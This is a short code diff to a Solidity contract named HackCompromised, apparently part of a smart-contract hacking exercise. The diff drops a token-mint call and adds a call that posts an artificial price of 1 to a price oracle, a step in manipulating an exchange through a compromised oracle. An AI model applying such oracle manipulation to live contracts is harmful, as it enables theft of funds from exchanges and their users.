@@ -19,9 +19,7 @@ contract HackCompromised {
     }
 
     function hack() public payable {
-        token.safeMint(address(this));
-        //require(msg.value > oracle.getMedianPrice(token.symbol()), "no te alcanza");
-        //exchange.buyOne{value: msg.value}();
+        oracle.postPrice(token.symbol(), 1);
         //exchange.sellOne(1);
     }
 
